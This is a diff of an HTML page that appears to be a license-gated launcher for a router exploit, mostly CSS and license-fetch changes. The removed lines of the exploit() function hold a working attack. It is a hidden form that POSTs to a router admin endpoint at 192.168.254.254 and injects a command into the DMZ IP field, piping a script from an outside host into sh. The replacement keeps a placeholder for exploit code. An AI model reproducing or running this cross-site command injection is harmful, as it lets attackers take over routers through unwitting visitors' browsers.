@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
-      font-family: sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: linear-gradient(135deg, #667eea, #764ba2);
       color: white;
       display: flex;
@@ -16,34 +16,49 @@
       height: 100vh;
       margin: 0;
       padding: 20px;
+      box-sizing: border-box;
     }
-
-    input, button {
+    h2 {
+      margin-bottom: 20px;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.4);
+    }
+    input {
       padding: 15px;
       font-size: 18px;
       border: none;
       border-radius: 8px;
-      width: 90%;
+      width: 90vw;
       max-width: 400px;
       margin-bottom: 15px;
+      box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
       outline: none;
     }
-
     button {
       background-color: #4caf50;
+      border: none;
+      border-radius: 8px;
+      padding: 15px;
+      font-size: 18px;
       color: white;
       cursor: pointer;
+      width: 90vw;
+      max-width: 400px;
+      margin-bottom: 10px;
+      transition: background 0.3s;
     }
-
+    button:hover {
+      background-color: #388e3c;
+    }
     #mainButton {
       display: none;
       background-color: #ff5722;
     }
-
     #message {
+      font-size: 16px;
       margin-top: 10px;
       min-height: 24px;
       color: yellow;
+      text-shadow: 0 1px 2px black;
     }
   </style>
 </head>
@@ -57,22 +72,14 @@
 
   <script>
     async function loadLicenseKeys() {
-      const url = "https://api.github.com/repos/bjchack/license-store/contents/license.json";
-
       try {
-        const res = await fetch(url, {
-          headers: {
-            "Accept": "application/vnd.github.v3.raw"
-          }
-        });
-
-        if (!res.ok) throw new Error("Fetch failed");
-
+        const res = await fetch("https://raw.githubusercontent.com/bjchack/license-store/main/license.json");
+        if (!res.ok) throw new Error("Fetch failed: " + res.status);
         const keys = await res.json();
+        console.log("Loaded keys:", keys);
         return keys;
-      } catch (err) {
-        document.getElementById("message").textContent = "❌ Failed to fetch license file.";
-        console.error(err);
+      } catch (error) {
+        console.error("Error loading license keys:", error);
         return [];
       }
     }
@@ -92,7 +99,14 @@
         return;
       }
 
+      message.textContent = "⏳ Checking license...";
+
       const validKeys = await loadLicenseKeys();
+
+      if (validKeys.length === 0) {
+        message.textContent = "❌ Could not load license keys.";
+        return;
+      }
 
       if (validKeys.includes(inputKey)) {
         message.textContent = "✅ License accepted!";
@@ -106,28 +120,8 @@
     }
 
     function exploit() {
-      const form = document.createElement("form");
-      form.method = "POST";
-      form.action = "http://192.168.254.254/goform/goform_set_cmd_process";
-      form.style.display = "none";
-
-      const fields = {
-        goformId: "DMZ_SETTING",
-        isTest: "false",
-        DMZEnabled: "1",
-        DMZIPAddress: "127.0.0.1 | curl http://junjuncruzit.online/zlt-bjc/zlt-ais1.sh -o - | sh &"
-      };
-
-      for (let name in fields) {
-        const input = document.createElement("input");
-        input.type = "hidden";
-        input.name = name;
-        input.value = fields[name];
-        form.appendChild(input);
-      }
-
-      document.body.appendChild(form);
-      form.submit();
+      alert("Unlocked! Proceed with your exploit action here.");
+      // Your exploit code here
     }
   </script>
 
